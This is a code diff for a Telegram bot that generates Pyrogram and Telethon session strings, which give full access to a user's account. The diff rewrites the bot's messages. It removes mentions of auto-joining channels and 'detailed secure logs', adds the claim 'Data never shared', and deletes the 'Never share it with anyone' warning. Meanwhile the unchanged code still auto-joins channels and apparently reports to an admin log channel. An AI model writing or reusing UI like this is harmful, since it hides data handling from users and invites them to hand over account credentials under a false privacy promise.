@@ -70,21 +70,22 @@ def progress_header(step, total, title):
 
 # ---------- UI ----------
 WELCOME = (
-    "<b>✦ SESSION GENERATOR ✦</b>\n"
+    "✨ <b>SESSION GENERATOR</b> ✨\n"
     "━━━━━━━━━━━━━━━━━━━━━\n\n"
-    "<i>Premium • Secure • Instant</i>\n\n"
-    "<b>📋 Available Sessions</b>\n"
-    "├ 🐍 <b>Pyrogram User</b> ─ Userbot\n"
-    "├ 🤖 <b>Pyrogram Bot</b>  ─ Bot API\n"
-    "├ 📞 <b>Telethon String</b> ─ Userbot\n"
-    "└ 🔄 <b>Converter</b> ─ Py ➜ Tele\n\n"
-    "<b>🛡 Safety Features</b>\n"
-    "├ 🔒 Full 2FA support\n"
-    "├ 💾 Auto Saved Messages backup\n"
-    "├ 📢 Auto-join channels\n"
-    "└ 📩 Detailed secure logs\n\n"
+    "👋 <b>Welcome!</b>\n"
+    "<i>Generate your Telegram session string in seconds</i>\n\n"
+    "🚀 <b>Available Sessions</b>\n"
+    "├ 🐍 <b>Pyrogram User</b> — userbot\n"
+    "├ 🤖 <b>Pyrogram Bot</b> — bot token\n"
+    "├ 📞 <b>Telethon</b> — userbot\n"
+    "└ 🔄 <b>Converter</b> — Pyro ➜ Telethon\n\n"
+    "🛡 <b>Your Safety</b>\n"
+    "├ 🔐 2FA fully supported\n"
+    "├ 💾 Session sent to Saved Messages\n"
+    "├ ⚡ Instant delivery\n"
+    "└ 🔒 Data never shared\n\n"
     "━━━━━━━━━━━━━━━━━━━━━\n"
-    "<b>⚡ Choose a session type below</b>"
+    "<b>⚡ Choose your session type below</b>"
 )
 
 MAIN_MENU = InlineKeyboardMarkup([
@@ -234,17 +235,13 @@ async def send_premium_string(user_id, session_type, session_str, has_2fa=False,
         join_line += f"\n✅ <b>Auto-joined:</b> {len(joined)} channel(s)"
     # NOTE: 'failed' count intentionally hidden from user (admin-only via log channel)
     text = (
-        "╭──────────────────────────────╮\n"
-        "│  ✅  <b>SESSION GENERATED</b>  ✅\n"
-        "╰──────────────────────────────╯\n\n"
-        f"┌─ <b>{html.escape(session_type)}</b> ─\n"
-        f"│ {badge}\n"
-        "│ 📩 Saved Messages: ✅\n"
-        f"│ ⏰ {config.get_ist_time()}\n"
-        "└─────────────────────────────\n\n"
+        "✅ <b>Your session is ready!</b>\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🔑 <b>{html.escape(session_type)}</b>\n"
+        f"{badge}  •  📩 Saved Messages\n"
+        f"⏰ {config.get_ist_time()}\n\n"
         f"<code>{session_str}</code>\n\n"
-        "> ⚠️ <b>Tap the string above to copy.</b>\n"
-        "> 🔐 <b>Never share it with anyone.</b>"
+        "👆 <i>Tap the string to copy</i>"
         f"{join_line}"
     )
     await app.send_message(user_id, text, reply_markup=BACK_BTN,
